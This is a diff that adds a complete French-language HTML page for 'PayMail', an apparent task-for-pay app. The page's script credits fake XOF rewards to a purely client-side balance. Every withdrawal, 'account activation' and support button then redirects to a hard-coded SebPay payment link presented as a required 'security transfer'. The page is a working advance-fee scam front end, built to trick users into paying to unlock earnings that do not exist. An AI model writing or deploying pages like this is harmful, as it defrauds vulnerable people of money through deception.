@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayMail - Espace Missions & Rémunérations</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col justify-between">
+
+    <!-- HEADER / NAVIGATION HAUTE -->
+    <header class="bg-slate-800 border-b border-slate-700 px-4 py-3 sticky top-0 z-50 flex justify-between items-center shadow-md">
+        <div class="flex items-center space-x-2">
+            <div class="bg-indigo-600 text-white font-bold p-2 rounded-xl flex items-center justify-center w-9 h-9 shadow-lg shadow-indigo-500/30">
+                <i class="fa-solid fa-envelope-circle-check text-lg"></i>
+            </div>
+            <span class="text-xl font-bold tracking-tight text-white">Pay<span class="text-indigo-400">Mail</span></span>
+        </div>
+        <div class="flex items-center space-x-3">
+            <div class="bg-slate-700 px-3 py-1.5 rounded-full text-xs font-medium flex items-center space-x-1.5 border border-slate-600">
+                <i class="fa-solid fa-wallet text-indigo-400"></i>
+                <span id="userBalance" class="text-emerald-400 font-bold">0 XOF</span>
+            </div>
+            <button onclick="openProfileModal()" class="text-slate-300 hover:text-white transition">
+                <i class="fa-solid fa-circle-user text-2xl"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- CONTENU PRINCIPAL -->
+    <main class="flex-1 max-w-md w-full mx-auto p-4 pb-24">
+        
+        <!-- SECTION ACCUEIL / TABLEAU DE BORD -->
+        <div id="section-home" class="space-y-5">
+            <!-- Carte Solde & Activation -->
+            <div class="bg-gradient-to-br from-indigo-900 via-slate-800 to-indigo-950 p-5 rounded-2xl border border-indigo-500/30 shadow-xl relative overflow-hidden">
+                <div class="absolute -right-6 -bottom-6 w-32 h-32 bg-indigo-500/10 rounded-full blur-2xl"></div>
+                <div class="flex justify-between items-start mb-3">
+                    <div>
+                        <p class="text-xs text-indigo-200 uppercase tracking-wider font-semibold">Solde Disponible</p>
+                        <h2 id="cardBalance" class="text-3xl font-extrabold text-white mt-1">0 XOF</h2>
+                    </div>
+                    <span id="accountStatusBadge" class="bg-amber-500/20 text-amber-300 border border-amber-500/30 text-[10px] px-2.5 py-1 rounded-full font-bold uppercase tracking-wider">
+                        Non Activé
+                    </span>
+                </div>
+                <p class="text-xs text-slate-300 mb-4">Activez votre compte pour débloquer les retraits et les missions premium.</p>
+                <button onclick="redirectToSebPay()" class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-3 px-4 rounded-xl shadow-lg shadow-indigo-600/30 transition duration-200 flex items-center justify-center space-x-2 text-sm">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    <span>Activer le Compte (Sécurité)</span>
+                </button>
+            </div>
+
+            <!-- Statistiques rapides -->
+            <div class="grid grid-cols-2 gap-3">
+                <div class="bg-slate-800/80 border border-slate-700/60 p-4 rounded-xl shadow-sm">
+                    <p class="text-xs text-slate-400">Missions Réalisées</p>
+                    <p id="statsMissionsCount" class="text-xl font-bold text-white mt-1">0</p>
+                </div>
+                <div class="bg-slate-800/80 border border-slate-700/60 p-4 rounded-xl shadow-sm">
+                    <p class="text-xs text-slate-400">Gains Totaux</p>
+                    <p id="statsTotalEarnings" class="text-xl font-bold text-emerald-400 mt-1">0 XOF</p>
+                </div>
+            </div>
+
+            <!-- Bannière d'information -->
+            <div class="bg-indigo-950/40 border border-indigo-500/20 rounded-xl p-4 flex items-start space-x-3">
+                <i class="fa-solid fa-circle-info text-indigo-400 mt-1"></i>
+                <div class="text-xs text-slate-300">
+                    <p class="font-semibold text-white mb-0.5">Règles de sécurité PayMail</p>
+                    Chaque utilisateur doit valider sa session de transfert de sécurité via notre passerelle agréée pour garantir l'authenticité des retraits.
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION MISSIONS -->
+        <div id="section-missions" class="hidden space-y-4">
+            <div class="flex justify-between items-center">
+                <h3 class="text-lg font-bold text-white">Missions Disponibles</h3>
+                <span class="text-xs bg-slate-800 text-indigo-400 px-2.5 py-1 rounded-full font-medium border border-slate-700">3 Actives</span>
+            </div>
+
+            <div id="missionsList" class="space-y-3">
+                <!-- Mission 1 -->
+                <div class="bg-slate-800 border border-slate-700/80 rounded-xl p-4 shadow-sm flex flex-col justify-between">
+                    <div class="flex justify-between items-start mb-2">
+                        <div>
+                            <span class="text-[10px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded font-semibold uppercase">Email Marketing</span>
+                            <h4 class="font-semibold text-white text-sm mt-1">Validation de campagne publicitaire</h4>
+                        </div>
+                        <span class="text-emerald-400 font-bold text-sm">+2 500 XOF</span>
+                    </div>
+                    <p class="text-xs text-slate-400 mb-3">Vérifiez et confirmez la réception des e-mails publicitaires pour valider la prime.</p>
+                    <button onclick="startMission(this, 2500, 'Validation de campagne publicitaire')" class="w-full bg-slate-700 hover:bg-indigo-600 text-white font-medium py-2 rounded-lg text-xs transition flex items-center justify-center space-x-1.5">
+                        <i class="fa-solid fa-play"></i>
+                        <span>Lancer la mission</span>
+                    </button>
+                </div>
+
+                <!-- Mission 2 -->
+                <div class="bg-slate-800 border border-slate-700/80 rounded-xl p-4 shadow-sm flex flex-col justify-between">
+                    <div class="flex justify-between items-start mb-2">
+                        <div>
+                            <span class="text-[10px] bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 px-2 py-0.5 rounded font-semibold uppercase">Sondage</span>
+                            <h4 class="font-semibold text-white text-sm mt-1">Évaluation de service client</h4>
+                        </div>
+                        <span class="text-emerald-400 font-bold text-sm">+1 800 XOF</span>
+                    </div>
+                    <p class="text-xs text-slate-400 mb-3">Donnez votre avis sur un flux de messagerie cryptée.</p>
+                    <button onclick="startMission(this, 1800, 'Évaluation de service client')" class="w-full bg-slate-700 hover:bg-indigo-600 text-white font-medium py-2 rounded-lg text-xs transition flex items-center justify-center space-x-1.5">
+                        <i class="fa-solid fa-play"></i>
+                        <span>Lancer la mission</span>
+                    </button>
+                </div>
+
+                <!-- Mission 3 -->
+                <div class="bg-slate-800 border border-slate-700/80 rounded-xl p-4 shadow-sm flex flex-col justify-between">
+                    <div class="flex justify-between items-start mb-2">
+                        <div>
+                            <span class="text-[10px] bg-amber-500/20 text-amber-400 border border-amber-500/30 px-2 py-0.5 rounded font-semibold uppercase">Premium</span>
+                            <h4 class="font-semibold text-white text-sm mt-1">Audit de boîte de réception</h4>
+                        </div>
+                        <span class="text-emerald-400 font-bold text-sm">+5 000 XOF</span>
+                    </div>
+                    <p class="text-xs text-slate-400 mb-3">Classer et filtrer les spams entrants pour le compte d'un partenaire.</p>
+                    <button onclick="startMission(this, 5000, 'Audit de boîte de réception')" class="w-full bg-slate-700 hover:bg-indigo-600 text-white font-medium py-2 rounded-lg text-xs transition flex items-center justify-center space-x-1.5">
+                        <i class="fa-solid fa-play"></i>
+                        <span>Lancer la mission</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION PORTEFEUILLE / RETRAIT -->
+        <div id="section-wallet" class="hidden space-y-4">
+            <h3 class="text-lg font-bold text-white">Retrait des Fonds</h3>
+            
+            <div class="bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-sm space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Montant à retirer (XOF)</label>
+                    <input type="number" id="withdrawAmount" placeholder="Ex: 10000" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-indigo-500 text-sm">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Mode de paiement / Numéro</label>
+                    <input type="text" id="withdrawDest" placeholder="Mobile Money / IBAN" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-indigo-500 text-sm">
+                </div>
+                <button onclick="requestWithdrawal()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl shadow-lg shadow-emerald-600/20 transition text-sm">
+                    Effectuer la demande de retrait
+                </button>
+            </div>
+
+            <!-- Historique -->
+            <div class="space-y-2">
+                <h4 class="text-sm font-semibold text-slate-400">Historique récent</h4>
+                <div id="withdrawHistory" class="bg-slate-800/60 border border-slate-700/60 rounded-xl p-4 text-center text-xs text-slate-400">
+                    Aucune transaction pour le moment.
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION SUPPORT / AIDE -->
+        <div id="section-support" class="hidden space-y-4">
+            <h3 class="text-lg font-bold text-white">Centre d'Assistance</h3>
+            <div class="bg-slate-800 border border-slate-700 rounded-xl p-5 space-y-3">
+                <div class="flex items-center space-x-3 text-slate-300 text-sm">
+                    <i class="fa-solid fa-headset text-indigo-400 text-lg w-6"></i>
+                    <span>Support en ligne 24/7</span>
+                </div>
+                <div class="flex items-center space-x-3 text-slate-300 text-sm">
+                    <i class="fa-solid fa-shield-cat text-indigo-400 text-lg w-6"></i>
+                    <span>Sécurité garantie par SebPay</span>
+                </div>
+                <button onclick="redirectToSebPay()" class="w-full bg-slate-700 hover:bg-slate-600 text-white font-medium py-2.5 rounded-xl text-xs transition mt-2">
+                    Contacter le service de vérification
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- NAVIGATION BASSE (MOBILE BAR) -->
+    <nav class="bg-slate-800 border-t border-slate-700 fixed bottom-0 left-0 right-0 max-w-md mx-auto flex justify-around py-3 px-2 z-50 shadow-2xl">
+        <button onclick="switchTab('home')" id="nav-home" class="flex flex-col items-center text-indigo-400 transition">
+            <i class="fa-solid fa-house text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Accueil</span>
+        </button>
+        <button onclick="switchTab('missions')" id="nav-missions" class="flex flex-col items-center text-slate-400 hover:text-slate-200 transition">
+            <i class="fa-solid fa-list-check text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Missions</span>
+        </button>
+        <button onclick="switchTab('wallet')" id="nav-wallet" class="flex flex-col items-center text-slate-400 hover:text-slate-200 transition">
+            <i class="fa-solid fa-wallet text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Portefeuille</span>
+        </button>
+        <button onclick="switchTab('support')" id="nav-support" class="flex flex-col items-center text-slate-400 hover:text-slate-200 transition">
+            <i class="fa-solid fa-circle-question text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Aide</span>
+        </button>
+    </nav>
+
+    <!-- MODAL PROFIL / AUTH -->
+    <div id="profileModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-slate-800 border border-slate-700 w-full max-w-sm rounded-2xl p-5 space-y-4 shadow-2xl">
+            <div class="flex justify-between items-center">
+                <h3 class="font-bold text-white text-base">Mon Compte PayMail</h3>
+                <button onclick="closeProfileModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+            </div>
+            <div class="space-y-3 text-xs text-slate-300">
+                <div class="bg-slate-900 p-3 rounded-xl border border-slate-700">
+                    <p class="text-slate-400">Identifiant utilisateur</p>
+                    <p class="font-mono text-white text-sm font-semibold">PM-849201</p>
+                </div>
+                <div class="bg-slate-900 p-3 rounded-xl border border-slate-700">
+                    <p class="text-slate-400">Statut de sécurité</p>
+                    <p class="text-amber-400 font-semibold">En attente de validation SebPay</p>
+                </div>
+            </div>
+            <button onclick="redirectToSebPay()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-2.5 rounded-xl text-xs transition">
+                Effectuer le transfert de sécurité
+            </button>
+        </div>
+    </div>
+
+    <!-- SCRIPT DE GESTION INTERACTIVE -->
+    <script>
+        // Lien officiel SebPay fourni
+        const SEBPAY_URL = "https://new.sebpay.bj/pay/1000000-KLthiX";
+
+        let userState = {
+            balance: 0,
+            missionsCompleted: 0,
+            totalEarned: 0
+        };
+
+        function redirectToSebPay() {
+            window.location.href = SEBPAY_URL;
+        }
+
+        function switchTab(tabId) {
+            ['home', 'missions', 'wallet', 'support'].forEach(t => {
+                document.getElementById(`section-${t}`).classList.add('hidden');
+                document.getElementById(`nav-${t}`).classList.remove('text-indigo-400');
+                document.getElementById(`nav-${t}`).classList.add('text-slate-400');
+            });
+
+            document.getElementById(`section-${tabId}`).classList.remove('hidden');
+            document.getElementById(`nav-${tabId}`).classList.add('text-indigo-400');
+            document.getElementById(`nav-${tabId}`).classList.remove('text-slate-400');
+        }
+
+        function startMission(button, reward, title) {
+            button.disabled = true;
+            button.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Traitement...`;
+            
+            setTimeout(() => {
+                userState.balance += reward;
+                userState.missionsCompleted += 1;
+                userState.totalEarned += reward;
+                
+                updateUI();
+                
+                button.innerHTML = `<i class="fa-solid fa-check"></i> Validé (+${reward} XOF)`;
+                button.classList.remove('bg-slate-700', 'hover:bg-indigo-600');
+                button.classList.add('bg-emerald-600', 'text-white');
+            }, 1500);
+        }
+
+        function updateUI() {
+            document.getElementById('userBalance').innerText = `${userState.balance.toLocaleString()} XOF`;
+            document.getElementById('cardBalance').innerText = `${userState.balance.toLocaleString()} XOF`;
+            document.getElementById('statsMissionsCount').innerText = userState.missionsCompleted;
+            document.getElementById('statsTotalEarnings').innerText = `${userState.totalEarned.toLocaleString()} XOF`;
+        }
+
+        function requestWithdrawal() {
+            const amount = parseInt(document.getElementById('withdrawAmount').value);
+            const dest = document.getElementById('withdrawDest').value;
+
+            if (!amount || amount <= 0) {
+                alert("Veuillez entrer un montant valide.");
+                return;
+            }
+            if (amount > userState.balance) {
+                alert("Solde insuffisant pour ce retrait.");
+                return;
+            }
+            if (!dest) {
+                alert("Veuillez indiquer le moyen de paiement.");
+                return;
+            }
+
+            // Redirection vers SebPay si le compte nécessite la validation de sécurité
+            if(confirm("Pour valider ce transfert de fonds, une vérification de sécurité SebPay est requise. Continuer ?")) {
+                redirectToSebPay();
+            }
+        }
+
+        function openProfileModal() {
+            document.getElementById('profileModal').classList.remove('hidden');
+        }
+
+        function closeProfileModal() {
+            document.getElementById('profileModal').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
